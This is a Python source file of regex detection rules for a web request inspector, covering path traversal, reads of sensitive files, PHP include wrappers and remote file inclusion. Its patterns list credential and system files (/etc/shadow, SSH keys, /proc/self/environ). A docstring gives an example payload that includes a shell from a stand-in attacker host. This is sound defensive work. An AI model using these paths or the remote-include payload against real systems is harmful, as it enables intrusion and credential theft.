"""Path traversal and local/remote file inclusion rules.

Attackers climb out of the web root (``../../``), name a file worth reading
(``/etc/passwd``), or abuse include wrappers (``php://filter``). A request that only
mentions a directory, a file extension or an ordinary URL stays quiet. Text is the
normalized form from ``Inspection``: URL-decoded repeatedly, so ``%2e%2e%2f`` and
``%252e%252e%252f`` are seen as ``../``. NUL bytes are stripped there, which means a
``%00`` suffix never hides the path in front of it.

All patterns are linear: no nested quantifiers, bounded gaps.
"""

import re
from typing import ClassVar

from workers.detector.rules import RegexRule, Rule, Severity

_FLAGS = re.IGNORECASE


def _compile(*patterns: str) -> tuple[re.Pattern[str], ...]:
    return tuple(re.compile(p, _FLAGS) for p in patterns)


class DotDotSlash(RegexRule):
    """``../``, ``..\\``, Tomcat's ``..;/``; ``....//`` contains ``../`` after filtering."""

    name = "traversal.dotdot"
    category = "traversal"
    severity = Severity.HIGH
    patterns: ClassVar = _compile(r"\.\.[/\\]", r"\.\.;/")


class SensitiveFile(RegexRule):
    """Files an attacker reads once a traversal works."""

    name = "traversal.sensitive_file"
    category = "traversal"
    severity = Severity.HIGH
    patterns: ClassVar = _compile(
        r"/etc/(?:passwd|shadow|group|gshadow|hosts|issue|sudoers|my\.cnf|crontab|"
        r"ssh/|ssl/private)",
        r"/proc/(?:self|\d{1,7})/(?:environ|cmdline|cwd|maps|fd/|status|mountinfo)",
        r"/(?:root|home/\w{1,32})/\.(?:ssh|bash_history|aws|docker|env)",
        r"\.ssh/(?:id_[a-z0-9]{2,10}|authorized_keys|known_hosts)",
        r"/var/log/(?:auth\.log|secure|syslog|messages|apache2?/|nginx/|httpd/)",
        r"\b[a-z]:[/\\]{1,2}(?:windows|winnt|boot\.ini|inetpub|users[/\\]{1,2}\w)",
        r"\bwindows[/\\]{1,2}(?:win\.ini|system32|repair)",
        r"\bwebapps?[/\\]|\bWEB-INF[/\\](?:web\.xml|classes|lib)",
        r"\b(?:wp-config|configuration|settings|database|config)\.(?:php|inc|bak|old|orig)\b",
    )


class IncludeWrapper(RegexRule):
    """PHP stream wrappers and other schemes used to read source or run code."""

    name = "traversal.wrapper"
    category = "traversal"
    severity = Severity.HIGH
    patterns: ClassVar = _compile(
        r"\bphp://(?:filter|input|stdin|fd|memory|temp)\b",
        r"\b(?:expect|phar|zip|glob|ogg|rar|ssh2)://",
        r"\bdata://text/",
        r"\bfile:///",
    )


class RemoteInclude(RegexRule):
    """``?page=http://evil.example/shell.txt``: a parameter that includes files, given a URL.

    Limited to parameter names that mean "include this"; ``url=``, ``redirect=`` and
    ``callback=`` carry URLs legitimately.
    """

    name = "traversal.remote_include"
    category = "traversal"
    severity = Severity.MEDIUM
    patterns: ClassVar = _compile(
        r"\b(?:file|page|include|inc|require|template|tpl|lang|module|load|doc|document|"
        r"path|folder|dir|conf)\w{0,12}=\s*(?:https?|ftp)://"
    )


RULES: tuple[Rule, ...] = (
    DotDotSlash(),
    SensitiveFile(),
    IncludeWrapper(),
    RemoteInclude(),
)
